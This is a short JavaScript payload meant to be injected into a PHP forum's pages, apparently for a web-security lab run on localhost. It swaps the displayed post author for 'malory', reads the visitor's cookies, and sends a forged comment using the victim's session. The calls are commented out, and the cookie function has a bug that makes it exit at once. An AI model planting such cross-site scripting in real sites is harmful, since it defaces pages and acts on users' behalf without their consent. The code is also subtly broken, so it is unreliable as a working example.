
<script>

    function nonPersistent(){
        let url = window.location.href;
        let isView = url.search("view.php[?]id=[0-9].");
        console.log(isView);
        if(isView > 0){
            let author = document.querySelector("small").textContent.toString();
            console.log(author);
            let authorArr = author.split(" ");
            authorArr[2] = "malory";
            let newAuthor = authorArr.join(" ");
            document.querySelector("small").textContent = newAuthor;
        }
    }
    //nonPersistent();



    function getPostId(){
        let url = window.location.href;
        let isView = url.search("view.php[?]id=[0-9].");
        console.log(isView);
        if(isView){
            let idArr = url.split("=")
            let id = parseInt(idArr[1]);
            return parseInt(id);
        }
        return -1
    }

    function leakCookies(postId){
        if(postId = -1){
            return;
        }

        let cookie = document.cookie;
        let cookieVal = cookie.split("=")[1];
        console.log(cookieVal);

        let requestOptions = {
            method: "POST",
            credentials: "include",
            body: "comment=bye&form=comment&parent=14&uid=0"
        };
        fetch("http://localhost:8080/ss2liang/post.php", requestOptions)
        .then(function(res){
            console.log(res);
        })
    }

    //leakCookies(getPostId());
</script>

